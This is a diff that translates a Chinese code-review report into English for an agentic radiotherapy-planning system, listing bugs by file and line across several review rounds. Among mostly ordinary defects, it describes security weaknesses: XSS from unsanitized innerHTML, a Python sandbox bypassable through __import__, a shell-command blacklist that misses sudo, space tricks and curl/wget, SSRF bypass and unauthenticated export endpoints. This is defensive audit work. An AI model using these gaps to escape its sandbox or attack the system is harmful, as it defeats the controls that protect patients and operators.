-| R-11 | 会话管理线程安全 | 待核实 | — |
-| R-12 | TaskManager 内存泄漏 | 待核实 | — |
-| R-13 | 速率限制线程安全 | 待核实 | — |
-| R-14 | 导出端点缺少 auth | 待核实 | — |
-| R-15 | `marked.parse()` XSS | ✅ 真 bug — 无消毒 | ✅ 已修复 |
-| R-16 | innerHTML 未消毒 | ✅ 通过 R-15 修复 (renderMarkdown 统一消毒) | ✅ 已修复 |
-| R-17 | DICOM 元数据未转义 | 待核实 | — |
-| R-18 | 思考指示器泄漏 | 待核实 | — |
-| R-19 | `_search_wanfang` 重复定义 | ✅ 真 bug — 复制粘贴错误 | ✅ 已修复 |
-| R-20 | `ref_direc` 未定义 | ✅ 真 bug — NameError | ✅ 已修复 |
-| R-21 | OAR mask 元数据错误 | 待核实 | — |
-| R-22 | 代码执行器沙箱绕过 | 待核实 | — |
-| R-23 | Shell 执行器验证绕过 | 待核实 | — |
-| R-24 | DICOM 轮廓几何无效 | 待核实 | — |
-| R-25 | DICOM 方向余弦 | 待核实 | — |
-| R-26 | SSRF 绕过 | 待核实 | — |
-| R-27 | env_manager 卸载跳过验证 | 待核实 | — |
-| R-28 | D90 单位不匹配 | 待核实 | — |
-| R-29 | 同步回调阻塞事件循环 | 待核实 | — |
-| R-30 | CompletenessChecker 角色错误 | ✅ 真 bug — 使用 SAFETY_GUARDIAN | ✅ 已修复 |
-| R-31 | SafetyGuardian 中文标签 | 待核实 | — |
-| R-32 | FactChecker 硬编码 pass | 待核实 | — |
-| R-33 | PlanReviewer 评分公式 | 待核实 | — |
-| R-34 | Gemini 丢弃 tool calls | 待核实 | — |
-| R-35 | Gemini system message 崩溃 | 待核实 | — |
-| R-36 | MCTS UCB1 公式错误 | 待核实 | — |
-| R-37 | Provider tool call 格式不一致 | 待核实 | — |
-| R-38 | ToolCodeWriter 代码执行 | 待核实 | — |
-| R-39 | InteractionMemory.clear() 崩溃 | 待核实 | — |
-| R-40 | experience_memory 无界增长 | 待核实 | — |
-| R-41 | self_evolution append 无上限 | 待核实 | — |
-| R-42 | skill_learner 参数解析 | 待核实 | — |
-| R-43 | language.py 空函数 | 待核实 | — |
-| R-44/45/46 | device_manager 线程安全 | 待核实 | — |
+| R-01 | `page_content` undefined | ✅ Real bug — NameError on empty search results | ✅ Fixed |
+| R-02/03/04 | Event loop leak | ✅ Real bug — exception paths do not close the loop | ✅ Fixed (try/finally) |
+| R-05 | `from AgenticSys import ToolResult` | ✅ Real bug — class does not exist in that module | ✅ Fixed |
+| R-06 | Prescription dose *120 | ⚠️ Design decision — normalized→Gy approximate conversion | Skipped (not a bug) |
+| R-07 | `_pending_callback_events` thread safety | To be verified | — |
+| R-08 | Streaming search step status | To be verified | — |
+| R-09 | `time.sleep` in generator | ⚠️ 80ms delay acceptable | Skipped (not critical) |
+| R-10 | Export endpoint path validation | To be verified | — |
+| R-11 | Session management thread safety | To be verified | — |
+| R-12 | TaskManager memory leak | To be verified | — |
+| R-13 | Rate limit thread safety | To be verified | — |
+| R-14 | Export endpoint missing auth | To be verified | — |
+| R-15 | `marked.parse()` XSS | ✅ Real bug — no sanitization | ✅ Fixed |
+| R-16 | innerHTML unsanitized | ✅ Fixed via R-15 (renderMarkdown centralized sanitization) | ✅ Fixed |
+| R-17 | DICOM metadata not escaped | To be verified | — |
+| R-18 | Thinking indicator leak | To be verified | — |
+| R-19 | `_search_wanfang` defined twice | ✅ Real bug — copy-paste error | ✅ Fixed |
+| R-20 | `ref_direc` undefined | ✅ Real bug — NameError | ✅ Fixed |
+| R-21 | OAR mask metadata wrong | To be verified | — |
+| R-22 | Code executor sandbox bypass | To be verified | — |
+| R-23 | Shell executor validation bypass | To be verified | — |
+| R-24 | DICOM contour geometry invalid | To be verified | — |
+| R-25 | DICOM direction cosines | To be verified | — |
+| R-26 | SSRF bypass | To be verified | — |
+| R-27 | env_manager uninstall skips verification | To be verified | — |
+| R-28 | D90 unit mismatch | To be verified | — |
+| R-29 | Synchronous callback blocks event loop | To be verified | — |
+| R-30 | CompletenessChecker wrong role | ✅ Real bug — uses SAFETY_GUARDIAN | ✅ Fixed |
+| R-31 | SafetyGuardian Chinese label | To be verified | — |
+| R-32 | FactChecker hardcoded pass | To be verified | — |
+| R-33 | PlanReviewer scoring formula | To be verified | — |
+| R-34 | Gemini discards tool calls | To be verified | — |
+| R-35 | Gemini system message crash | To be verified | — |
+| R-36 | MCTS UCB1 formula wrong | To be verified | — |
+| R-37 | Provider tool call format inconsistent | To be verified | — |
+| R-38 | ToolCodeWriter code execution | To be verified | — |
+| R-39 | InteractionMemory.clear() crash | To be verified | — |
+| R-40 | experience_memory unbounded growth | To be verified | — |
+| R-41 | self_evolution append unbounded | To be verified | — |
+| R-42 | skill_learner argument parsing | To be verified | — |
+| R-43 | language.py empty function | To be verified | — |
+| R-44/45/46 | device_manager thread safety | To be verified | — |
 
-### 第二轮已修复问题 (8 个)
+### Second-Round Fixed Issues (8)
 
-| # | 文件 | 修复内容 |
+| # | File | Fix Content |
 |---|------|----------|
-| R-01 | AgenticSys.py | `page_content = ""` 初始化 |
-| R-02/03/04 | AgenticSys.py | 3 处 event loop `try/finally` 保护 |
+| R-01 | AgenticSys.py | Initialize `page_content = ""` |
+| R-02/03/04 | AgenticSys.py | `try/finally` protection for 3 event loops |
 | R-05 | AgenticSys.py | `from AgenticSys import` → `from tool_factory import` |
-| R-15/16 | index.html | 添加 `_sanitizeHtml()` 消毒器 |
-| R-19 | web_search/__init__.py | 删除 `_search_iop` 内死代码 |
+| R-15/16 | index.html | Added `_sanitizeHtml()` sanitizer |
+| R-19 | web_search/__init__.py | Removed dead code inside `_search_iop` |
 | R-20 | planning_pipeline.py | `ref_direc` → `"auto"` |
-| R-30 | 3 个文件 | 添加 `COMPLETENESS_CHECKER` 角色 |
+| R-30 | 3 files | Added the `COMPLETENESS_CHECKER` role |
 
-### 第二轮问题统计
+### Second-Round Issue Statistics
 
-| 严重度 | 数量 | 关键发现 |
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| 🔴 Critical | 8 | event loop 泄漏(3)、NameError(2)、XSS(1)、代码执行(1)、重复定义(1) |
-| 🟠 High | 14 | 线程安全(3)、逻辑错误(4)、安全绕过(3)、功能bug(4) |
-| 🟡 Medium | 14 | 内存泄漏(5)、安全弱点(3)、逻辑(6) |
-| 🔵 Low | 2 | 解析bug、死代码 |
-| **总计** | **38** | |
+| 🔴 Critical | 8 | event loop leaks (3), NameError (2), XSS (1), code execution (1), duplicate definition (1) |
+| 🟠 High | 14 | thread safety (3), logic errors (4), security bypass (3), functional bugs (4) |
+| 🟡 Medium | 14 | memory leaks (5), security weaknesses (3), logic (6) |
+| 🔵 Low | 2 | parsing bug, dead code |
+| **Total** | **38** | |
 
 ---
 
 ---
 
-## 第三轮全维度深度审查 (2026-06-27)
+## Third-Round Full-Dimension Deep Review (2026-06-27)
 
-> 8 个并行 Agent 对全部子系统进行第三轮深度审查：AgenticSys 核心、Web 服务器、规划算法、工具链、大脑/记忆系统、前端、Prompt/Agent、完整性评审。
+> 8 parallel Agents performed a third round of deep review across all subsystems: AgenticSys core, Web server, planning algorithms, toolchain, brain/memory systems, frontend, Prompt/Agent, and completeness review.
 
-### 审查统计
+### Review Statistics
 
-| 维度 | Agent 覆盖 | 新发现 | 已验证 | 更正 |
+| Dimension | Agent Coverage | New Findings | Verified | Corrections |
 |------|-----------|--------|--------|------|
-| AgenticSys.py | 6849 行逐段 | 9 | 2 | 0 |
-| web/server.py | 150 符号 | 6 | 5 | 0 |
-| plans/ | 12 文件 ~4000 行 | 12 | 3 | 1 (constraint_bounds 非 bug) |
-| tool_factory/ | 100+ 文件 | 8 | 3 | 0 |
-| brain/ + memory/ | 30+ 文件 | 7 | 3 | 0 |
-| 前端 index.html | ~20000 行 | 5 | 2 | 0 |
-| prompts/ + agents/ | 15+ 文件 | 4 | 3 | 1 (R-31 非 bug) |
-| 完整性评审 | 8 维度 | 8 | 0 | 0 |
-| **总计** | **281 文件** | **59** | **21** | **2** |
+| AgenticSys.py | 6849 lines section by section | 9 | 2 | 0 |
+| web/server.py | 150 symbols | 6 | 5 | 0 |
+| plans/ | 12 files ~4000 lines | 12 | 3 | 1 (constraint_bounds not a bug) |
+| tool_factory/ | 100+ files | 8 | 3 | 0 |
+| brain/ + memory/ | 30+ files | 7 | 3 | 0 |
+| frontend index.html | ~20000 lines | 5 | 2 | 0 |
+| prompts/ + agents/ | 15+ files | 4 | 3 | 1 (R-31 not a bug) |
+| completeness review | 8 dimensions | 8 | 0 | 0 |
+| **Total** | **281 files** | **59** | **21** | **2** |
 
 ---
 
-### 第三轮关键发现 — 🔴 Critical
+### Third-Round Key Findings — 🔴 Critical
 
-| # | 文件 | 行号 | 问题 | 类型 |
+| # | File | Lines | Issue | Type |
 |---|------|------|------|------|
-| T3-01 | brain/providers/gemini_llm.py | 107-114 | **Gemini 永远丢弃 tool calls** — `tool_calls=[]` 硬编码，即使 API 返回函数调用也不解析 | ✅ 已验证 R-34 |
-| T3-02 | brain/core/tree_search_planner.py | 47-51 | **MCTS UCB1 公式损坏** — `parent_visits` 硬编码为 1，`_get_parent_visits()` 方法存在但从未调用，树搜索退化为近随机选择 | ✅ 已验证 R-36 |
-| T3-03 | web/server.py | 2866-2868 | **剂量等高线单位不匹配** — 剂量数组为归一化单位 (0-94)，但等高线查找使用绝对 Gy 值 (如 120, 180)，永远不会找到等高线 | 🆕 新功能 bug |
-| T3-04 | AgenticSys.py | 5058-5171 | **_pending_callback_events 线程不安全** — 列表在多线程环境下无锁操作，clear() 与 append() 竞态 | ✅ 已验证 R-07 |
-| T3-05 | plans/reinforcement.py | 243, 250 | **_reward_core None 崩溃** — JIT 扩展不可用时 `_reward_core=None`，但无条件调用 `_reward_core._dvh_oar_jit()` | ✅ 已验证 |
-| T3-06 | web/app/index.html | 多处 | **7 处 innerHTML 未消毒** — 行 5601, 8960, 11983, 17645, 18472, 19770, 20347 绕过 `_sanitizeHtml()` | 🆕 XSS 残留 |
+| T3-01 | brain/providers/gemini_llm.py | 107-114 | **Gemini always discards tool calls** — `tool_calls=[]` is hardcoded; function calls returned by the API are not parsed | ✅ Verified R-34 |
+| T3-02 | brain/core/tree_search_planner.py | 47-51 | **MCTS UCB1 formula broken** — `parent_visits` hardcoded to 1; the `_get_parent_visits()` method exists but is never called, degrading tree search to near-random selection | ✅ Verified R-36 |
+| T3-03 | web/server.py | 2866-2868 | **Dose contour unit mismatch** — the dose array is in normalized units (0-94), but contour lookup uses absolute Gy values (e.g., 120, 180), so contours can never be found | 🆕 New functional bug |
+| T3-04 | AgenticSys.py | 5058-5171 | **_pending_callback_events not thread-safe** — the list is operated on without a lock in a multithreaded environment; clear() and append() race | ✅ Verified R-07 |
+| T3-05 | plans/reinforcement.py | 243, 250 | **_reward_core None crash** — when the JIT extension is unavailable, `_reward_core=None`, yet `_reward_core._dvh_oar_jit()` is called unconditionally | ✅ Verified |
+| T3-06 | web/app/index.html | multiple | **7 innerHTML usages unsanitized** — lines 5601, 8960, 11983, 17645, 18472, 19770, 20347 bypass `_sanitizeHtml()` | 🆕 XSS residual |
 
-### 第三轮关键发现 — 🟠 High
+### Third-Round Key Findings — 🟠 High
 
-| # | 文件 | 行号 | 问题 | 类型 |
+| # | File | Lines | Issue | Type |
 |---|------|------|------|------|
-| T3-07 | AgenticSys.py | 135-660 | **AgentMemory 内存泄漏** — planning_results 字典、tool_results 列表无上限，大 numpy 数组无清理钩子 | 🆕 |
-| T3-08 | AgenticSys.py | 5367-5382 | **批量存储竞态** — 流式版本中 generator yield 导致消费者断开时，已执行工具的结果不会持久化 | 🆕 |
-| T3-09 | AgenticSys.py | 4373-4399 | **响应清理数据丢失** — `_clean_response_text` 用 30+ 正则过度清理，多次应用导致累积丢失 | 🆕 |
-| T3-10 | web/server.py | 234-285 | **会话管理非线程安全** — `_sessions` 字典在 Flask threaded=True 下无锁访问 | ✅ 已验证 R-11 |
-| T3-11 | web/server.py | 3272-3293 | **SSE 流资源泄漏** — 无超时、无客户端断开检测、无清理保证 | 🆕 |
-| T3-12 | plans/geometry.py | 1016 | **空 mask 崩溃** — `find_island_center_adaptive_sigma` 不检查空数组，`np.mean` 返回 NaN | 🆕 |
-| T3-13 | plans/fitting_model.py | 291-307 | **DoseOptimizationLoss 梯度不连续** — 方向与 x 轴对齐时的硬分支创建零梯度，优化不稳定 | 🆕 |
-| T3-14 | tool_factory/seed_plan/planning_pipeline.py | 623, 988 | **硬编码 [0,1,0] 回退** — 自动恢复路径使用前方向，绕过器官感知修复，胰腺/前列腺病例会失败 | 🆕 |
-| T3-15 | tool_factory/code_executor/__init__.py | 101 | **沙箱完全可绕过** — `__import__` 在 safe_builtins 中，ALLOWED_MODULES 不限制 `__import__` 可访问的模块 | 🆕 |
-| T3-16 | brain/core/tool_code_writer.py | 193-199 | **动态代码执行** — 尽管有安全验证，仍使用 importlib 执行任意 Python 代码 | ✅ 已验证 R-38 |
-| T3-17 | memory/experience_memory.py | 107-127 | **经验记忆无界增长** — record() 无限追加，_save() 每次重写整个 JSON 文件 | ✅ 已验证 R-40 |
-| T3-18 | agents/fact_checker.py | 207 | **FactChecker `decision` 硬编码 pass** — 主 Agent 独立验证：`decision` 在主路径无消费者（`format_as_source_summary` 只读 concerns，quality gate APPEND-ONLY 不阻断）。非 bug，是咨询型 agent 的设计意图。已做 cosmetic 改进。 | ⚠️ 降级为 cosmetic |
-| T3-19 | agents/orchestrator.py | 190-194 | **同步回调阻塞事件循环** — `run_in_executor` 模式正确但 llm_callback 可能非线程安全 | ✅ 已验证 R-29 |
-| T3-20 | config/prompts/medical_safety.md | 10-33 | **OAR 剂量限制硬编码** — 器官耐受值嵌入 prompt 而非运行时从 clinical_kb 获取，可能过时 | 🆕 |
-| T3-21 | 完整性评审 | 全局 | **无 Dockerfile / 部署方案** — 无容器化、无 gunicorn、无 SSL 终止、无部署文档 | 🆕 |
-| T3-22 | 完整性评审 | 全局 | **_global_agent 绕过会话隔离** — 多用户并发时可能共享状态 | 🆕 |
+| T3-07 | AgenticSys.py | 135-660 | **AgentMemory memory leak** — the planning_results dict and tool_results list have no upper bound; large numpy arrays have no cleanup hook | 🆕 |
+| T3-08 | AgenticSys.py | 5367-5382 | **Batch storage race** — in the streaming version, a generator yield causing the consumer to disconnect means results of already-executed tools are not persisted | 🆕 |
+| T3-09 | AgenticSys.py | 4373-4399 | **Response cleanup data loss** — `_clean_response_text` over-cleans with 30+ regexes; repeated application causes cumulative loss | 🆕 |
+| T3-10 | web/server.py | 234-285 | **Session management not thread-safe** — the `_sessions` dict is accessed without a lock under Flask threaded=True | ✅ Verified R-11 |
+| T3-11 | web/server.py | 3272-3293 | **SSE stream resource leak** — no timeout, no client disconnect detection, no cleanup guarantee | 🆕 |
+| T3-12 | plans/geometry.py | 1016 | **Empty mask crash** — `find_island_center_adaptive_sigma` does not check for an empty array; `np.mean` returns NaN | 🆕 |
+| T3-13 | plans/fitting_model.py | 291-307 | **DoseOptimizationLoss gradient discontinuity** — a hard branch when the direction aligns with the x-axis creates zero gradients, making optimization unstable | 🆕 |
+| T3-14 | tool_factory/seed_plan/planning_pipeline.py | 623, 988 | **Hardcoded [0,1,0] fallback** — the automatic recovery path uses the anterior direction, bypassing organ-aware repair; pancreatic/prostate cases will fail | 🆕 |
+| T3-15 | tool_factory/code_executor/__init__.py | 101 | **Sandbox fully bypassable** — `__import__` is in safe_builtins and ALLOWED_MODULES does not restrict the modules `__import__` can access | 🆕 |
+| T3-16 | brain/core/tool_code_writer.py | 193-199 | **Dynamic code execution** — despite security validation, importlib is used to execute arbitrary Python code | ✅ Verified R-38 |
+| T3-17 | memory/experience_memory.py | 107-127 | **Experience memory unbounded growth** — record() appends without limit; _save() rewrites the entire JSON file each time | ✅ Verified R-40 |
+| T3-18 | agents/fact_checker.py | 207 | **FactChecker `decision` hardcoded pass** — main Agent independent verification: `decision` has no consumer on the main path (`format_as_source_summary` only reads concerns; the quality gate is APPEND-ONLY and does not block). Not a bug; it is the intended design of an advisory agent. Cosmetic improvement made. | ⚠️ Downgraded to cosmetic |
+| T3-19 | agents/orchestrator.py | 190-194 | **Synchronous callback blocks event loop** — the `run_in_executor` pattern is correct but llm_callback may not be thread-safe | ✅ Verified R-29 |
+| T3-20 | config/prompts/medical_safety.md | 10-33 | **OAR dose limits hardcoded** — organ tolerance values are embedded in the prompt rather than fetched from clinical_kb at runtime, and may be outdated | 🆕 |
+| T3-21 | completeness review | global | **No Dockerfile / deployment solution** — no containerization, no gunicorn, no SSL termination, no deployment documentation | 🆕 |
+| T3-22 | completeness review | global | **_global_agent bypasses session isolation** — state may be shared under concurrent multi-user access | 🆕 |
 
-### 第三轮关键发现 — 🟡 Medium
+### Third-Round Key Findings — 🟡 Medium
 
-| # | 文件 | 行号 | 问题 | 类型 |
+| # | File | Lines | Issue | Type |
 |---|------|------|------|------|
-| T3-23 | web/server.py | 45-93 | **TaskManager 内存泄漏** — 任务永不清理，无 TTL、无驱逐策略 | ✅ 已验证 R-12 |
-| T3-24 | web/server.py | 116-139 | **速率限制非线程安全** — `_rate_limit_store` 无同步，并发下可绕过 | ✅ 已验证 R-13 |
-| T3-25 | web/server.py | 3153, 3194 | **导出端点 auth 不一致** — DICOM-RT 和 STL 导出无 @require_api_key | ✅ 已验证 R-14 |
-| T3-26 | AgenticSys.py | 4712 | **搜索步骤状态误导** — 搜索失败仍设 status="done" | ✅ 已验证 R-08 |
-| T3-27 | plans/core.py | 92-101 | **init_plan 缺少最小角度保护** — extract_angle 无限缩小时仍跑满 50 次迭代 | 🆕 |
-| T3-28 | plans/utilizations.py | 751 | **魔法数字 1e5** — 应使用 np.inf | 🆕 |
-| T3-29 | plans/reinforcement.py | 711 | **DVH2Rewards 潜在除零** — 空 CTV 时 target_v=0 | 🆕 |
-| T3-30 | plans/reinforcement.py | 259-260 | **异常吞噬** — SeedPlacementReward.forward 静默捕获所有异常返回零奖励 | 🆕 |
-| T3-31 | tool_factory/shell_executor/__init__.py | 22-26 | **命令黑名单不完整** — 空格绕过、sudo 未阻止、curl/wget 被允许 | 🆕 |
-| T3-32 | tool_factory/report_generator/__init__.py | 108 | **D90 显示单位错误** — 显示为百分比但应为 Gy | ✅ 已验证 R-28 |
-| T3-33 | brain/providers/*.py | 多处 | **9/16 Provider tool call 格式不一致** — Qwen/DeepSeek 缺少 id 字段，Gemini 返回空列表 | ✅ 已验证 R-37 |
-| T3-34 | memory/interaction_memory.py | 176 | **clear() NameError** — 缺少 logger 导入 | ✅ 已验证 R-39 |
-| T3-35 | memory/self_evolution.py | 69-73 | **进化日志无界增长** | ✅ 已验证 R-41 |
-| T3-36 | agents/plan_reviewer.py | 226 | **评分公式有缺陷** — 小样本时分数偏低，不考虑严重性权重 | ✅ 已验证 R-33 |
-| T3-37 | agents/safety_guardian.py | 146 | **min_coverage 硬编码 0.80** — 不从 plan_config 读取 | 🆕 |
-| T3-38 | 完整性评审 | 全局 | **GPU 内存管理缺失** — 仅 1 个文件调用 empty_cache()，模型权重无清理 | 🆕 |
-| T3-39 | 完整性评审 | 全局 | **无流水线回滚** — LLM 中途失败留下部分状态 | 🆕 |
-| T3-40 | 前端 | 多处 | **40+ 全局变量** — 无 IIFE 或模块封装，重复定义 escHtml | 🆕 |
+| T3-23 | web/server.py | 45-93 | **TaskManager memory leak** — tasks are never cleaned up; no TTL, no eviction policy | ✅ Verified R-12 |
+| T3-24 | web/server.py | 116-139 | **Rate limiting not thread-safe** — `_rate_limit_store` has no synchronization and can be bypassed under concurrency | ✅ Verified R-13 |
+| T3-25 | web/server.py | 3153, 3194 | **Export endpoint auth inconsistent** — DICOM-RT and STL exports lack @require_api_key | ✅ Verified R-14 |
+| T3-26 | AgenticSys.py | 4712 | **Search step status misleading** — search failure still sets status="done" | ✅ Verified R-08 |
+| T3-27 | plans/core.py | 92-101 | **init_plan lacks minimum angle protection** — runs all 50 iterations even as extract_angle shrinks without bound | 🆕 |
+| T3-28 | plans/utilizations.py | 751 | **Magic number 1e5** — should use np.inf | 🆕 |
+| T3-29 | plans/reinforcement.py | 711 | **Potential division by zero in DVH2Rewards** — target_v=0 when CTV is empty | 🆕 |
+| T3-30 | plans/reinforcement.py | 259-260 | **Exception swallowing** — SeedPlacementReward.forward silently catches all exceptions and returns zero reward | 🆕 |
+| T3-31 | tool_factory/shell_executor/__init__.py | 22-26 | **Command blacklist incomplete** — space bypass, sudo not blocked, curl/wget allowed | 🆕 |
+| T3-32 | tool_factory/report_generator/__init__.py | 108 | **D90 display unit wrong** — displayed as a percentage but should be Gy | ✅ Verified R-28 |
+| T3-33 | brain/providers/*.py | multiple | **tool call format inconsistent across 9/16 providers** — Qwen/DeepSeek lack the id field, Gemini returns an empty list | ✅ Verified R-37 |
+| T3-34 | memory/interaction_memory.py | 176 | **clear() NameError** — missing logger import | ✅ Verified R-39 |
+| T3-35 | memory/self_evolution.py | 69-73 | **Evolution log unbounded growth** | ✅ Verified R-41 |
+| T3-36 | agents/plan_reviewer.py | 226 | **Scoring formula flawed** — scores are low for small samples and do not consider severity weights | ✅ Verified R-33 |
+| T3-37 | agents/safety_guardian.py | 146 | **min_coverage hardcoded 0.80** — not read from plan_config | 🆕 |
+| T3-38 | completeness review | global | **GPU memory management missing** — only 1 file calls empty_cache(); model weights are not cleaned up | 🆕 |
+| T3-39 | completeness review | global | **No pipeline rollback** — an LLM failure midway leaves partial state | 🆕 |
+| T3-40 | frontend | multiple | **40+ global variables** — no IIFE or module encapsulation; escHtml defined repeatedly | 🆕 |
 
-### 第三轮关键发现 — 🔵 Low
+### Third-Round Key Findings — 🔵 Low
 
-| # | 文件 | 行号 | 问题 | 类型 |
+| # | File | Lines | Issue | Type |
 |---|------|------|------|------|
-| T3-41 | plans/fitting_model.py | 430 | **注释/代码不一致** — 注释说除以 10，代码除以 2 | 🆕 |
-| T3-42 | plans/device_manager.py | 317 | **_leases append 未加锁** | 🆕 |
-| T3-43 | plans/device_manager.py | 384 | **OOM 重试阈值硬编码 1500MB** | 🆕 |
-| T3-44 | tool_factory/web_search/__init__.py | 1589-1615 | **_search_weather 死代码** — 方法委托给独立函数，旧代码未清理 | 🆕 |
-| T3-45 | tool_factory/seed_plan/planning_pipeline.py | 1540-1545 | **step_callback 异常吞噬** — except Exception 不记录日志 | 🆕 |
-| T3-46 | brain/providers/*.py | 多处 | **10+ Provider 缺少流式支持和重试逻辑** | 🆕 |
-| T3-47 | memory/layered_memory.py | 151-176 | **非原子写入** — 直接写 JSON 无 temp+rename 模式 | 🆕 |
-| T3-48 | memory/smart_context.py | 169-171 | **Token 估算不准** — `len(text)//4` 对中文/代码不准确 | 🆕 |
-| T3-49 | 前端 | 8707+ | **Three.js 缺少 renderer.dispose()** 和 controls.dispose() | 🆕 |
-| T3-50 | 完整性评审 | 全局 | **DOSE_SCALE 120.0 硬编码于 3+ 处** — 违反 DRY | 🆕 |
-| T3-51 | 完整性评审 | 全局 | **患者姓名可能记入日志** — DICOM 头信息含姓名 | 🆕 |
-| T3-52 | 完整性评审 | 全局 | **依赖无版本上限** — requirements.txt 全用 >=，关键依赖被注释掉 | 🆕 |
+| T3-41 | plans/fitting_model.py | 430 | **Comment/code mismatch** — comment says divide by 10, code divides by 2 | 🆕 |
+| T3-42 | plans/device_manager.py | 317 | **_leases append not locked** | 🆕 |
+| T3-43 | plans/device_manager.py | 384 | **OOM retry threshold hardcoded 1500MB** | 🆕 |
+| T3-44 | tool_factory/web_search/__init__.py | 1589-1615 | **_search_weather dead code** — the method delegates to a standalone function; old code not cleaned up | 🆕 |
+| T3-45 | tool_factory/seed_plan/planning_pipeline.py | 1540-1545 | **step_callback exception swallowing** — except Exception does not log | 🆕 |
+| T3-46 | brain/providers/*.py | multiple | **10+ providers lack streaming support and retry logic** | 🆕 |
+| T3-47 | memory/layered_memory.py | 151-176 | **Non-atomic write** — writes JSON directly with no temp+rename pattern | 🆕 |
+| T3-48 | memory/smart_context.py | 169-171 | **Inaccurate token estimation** — `len(text)//4` is inaccurate for Chinese/code | 🆕 |
+| T3-49 | frontend | 8707+ | **Three.js missing renderer.dispose()** and controls.dispose() | 🆕 |
+| T3-50 | completeness review | global | **DOSE_SCALE 120.0 hardcoded in 3+ places** — violates DRY | 🆕 |
+| T3-51 | completeness review | global | **Patient names may be logged** — DICOM headers contain names | 🆕 |
+| T3-52 | completeness review | global | **Dependencies have no version upper bound** — requirements.txt uses >= throughout, key dependencies commented out | 🆕 |
 
 ---
 
-### 前轮发现更正
+### Corrections to Previous-Round Findings
 
-| # | 原报告 | 更正 |
+| # | Original Report | Correction |
 |---|--------|------|
-| plans/utilizations.py:1463 | 报告称 `constraint_bounds` 使用 `&` (AND)，逻辑永远为 False | ❌ **实际使用 `|` (OR)，逻辑正确。** 前轮审查误判 |
-| agents/safety_guardian.py | 报告称 R-31 "zh" 标签与英文相同未翻译 | ❌ **SafetyGuardian 完全没有 i18n 支持，是缺失功能而非翻译 bug** |
+| plans/utilizations.py:1463 | Report claimed `constraint_bounds` uses `&` (AND) and the logic is always False | ❌ **It actually uses `|` (OR); the logic is correct.** The previous round misjudged it |
+| agents/safety_guardian.py | Report claimed R-31's "zh" label is identical to English and untranslated | ❌ **SafetyGuardian has no i18n support at all; it is a missing feature rather than a translation bug** |
 
 ---
 
-### 第三轮问题核实矩阵
+### Third-Round Issue Verification Matrix
 
-| # | 问题 | 核实结果 | 状态 |
+| # | Issue | Verification Result | Status |
 |---|------|----------|------|
-| R-07 | _pending_callback_events 线程安全 | ✅ 确认无锁 | 🔴 待修复 |
-| R-08 | 流式搜索 step 状态 | ✅ 确认失败也显示 done | 🟡 待修复 |
-| R-10 | 导出路径验证 TOCTOU | ✅ 确认 makedirs 在验证前 | 🟡 待修复 |
-| R-11 | 会话管理线程安全 | ✅ 确认无锁字典操作 | 🟠 待修复 |
-| R-12 | TaskManager 内存泄漏 | ✅ 确认无驱逐策略 | 🟡 待修复 |
-| R-13 | 速率限制线程安全 | ✅ 确认无同步 | 🟡 待修复 |
-| R-14 | 导出 auth 不一致 | ✅ 确认 2/4 端点无 auth | 🟡 待修复 |
-| R-28 | D90 单位不匹配 | ✅ 确认显示为 % 应为 Gy | 🟡 待修复 |
-| R-29 | 同步回调阻塞 | ✅ 确认 run_in_executor 模式 | 🟠 待修复 |
-| R-32 | FactChecker 硬编码 pass | ✅ 确认 decision="pass" 硬编码 | 🟠 待修复 |
-| R-33 | PlanReviewer 评分公式 | ✅ 确认公式不考虑严重性 | 🟡 待修复 |
-| R-34 | Gemini 丢弃 tool calls | ✅ 确认 tool_calls=[] 硬编码 | 🔴 待修复 |
-| R-36 | MCTS UCB1 损坏 | ✅ 确认 parent_visits=1 硬编码 | 🔴 待修复 |
-| R-37 | Provider 格式不一致 | ✅ 确认 9/16 不一致 | 🟡 待修复 |
-| R-38 | ToolCodeWriter 代码执行 | ✅ 确认 importlib 执行 | 🟠 安全风险 |
-| R-39 | InteractionMemory.clear() | ✅ 确认缺少 logger 导入 | 🟡 待修复 |
-| R-40 | ExperienceMemory 无界增长 | ✅ 确认无上限 | 🟠 待修复 |
-| R-41 | SelfEvolution 日志无界 | ✅ 确认无清理 | 🟡 待修复 |
+| R-07 | _pending_callback_events thread safety | ✅ Confirmed no lock | 🔴 To be fixed |
+| R-08 | Streaming search step status | ✅ Confirmed failure also shows done | 🟡 To be fixed |
+| R-10 | Export path validation TOCTOU | ✅ Confirmed makedirs before validation | 🟡 To be fixed |
+| R-11 | Session management thread safety | ✅ Confirmed lockless dict operations | 🟠 To be fixed |
+| R-12 | TaskManager memory leak | ✅ Confirmed no eviction policy | 🟡 To be fixed |
+| R-13 | Rate limit thread safety | ✅ Confirmed no synchronization | 🟡 To be fixed |
+| R-14 | Export auth inconsistent | ✅ Confirmed 2/4 endpoints lack auth | 🟡 To be fixed |
+| R-28 | D90 unit mismatch | ✅ Confirmed displayed as % but should be Gy | 🟡 To be fixed |
+| R-29 | Synchronous callback blocking | ✅ Confirmed run_in_executor pattern | 🟠 To be fixed |
+| R-32 | FactChecker hardcoded pass | ✅ Confirmed decision="pass" hardcoded | 🟠 To be fixed |
+| R-33 | PlanReviewer scoring formula | ✅ Confirmed formula does not consider severity | 🟡 To be fixed |
+| R-34 | Gemini discards tool calls | ✅ Confirmed tool_calls=[] hardcoded | 🔴 To be fixed |
+| R-36 | MCTS UCB1 broken | ✅ Confirmed parent_visits=1 hardcoded | 🔴 To be fixed |
+| R-37 | Provider format inconsistent | ✅ Confirmed 9/16 inconsistent | 🟡 To be fixed |
+| R-38 | ToolCodeWriter code execution | ✅ Confirmed importlib execution | 🟠 Security risk |
+| R-39 | InteractionMemory.clear() | ✅ Confirmed missing logger import | 🟡 To be fixed |
+| R-40 | ExperienceMemory unbounded growth | ✅ Confirmed no upper bound | 🟠 To be fixed |
+| R-41 | SelfEvolution log unbounded | ✅ Confirmed no cleanup | 🟡 To be fixed |
 
-**已核实 21 项**：14 个确认为真 bug，2 个更正前轮误判，5 个为设计权衡/低风险。
+**21 items verified**: 14 confirmed as real bugs, 2 corrections to previous-round misjudgments, 5 design trade-offs/low risk.
 
 ---
 
-### 第三轮问题统计
+### Third-Round Issue Statistics
 
-| 严重度 | 数量 | 关键发现 |
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| 🔴 Critical | 6 | Gemini 丢 tool calls、MCTS UCB1 损坏、剂量等高线单位、线程竞态、RL 崩溃、XSS 残留 |
-| 🟠 High | 16 | 内存泄漏(3)、线程安全(2)、沙箱绕过(2)、梯度不连续(1)、FactChecker 无效(1)、OAR 硬编码(1)、部署缺失(1)、会话隔离(1)、SSE 泄漏(1)、空 mask(1)、规划回退(1) |
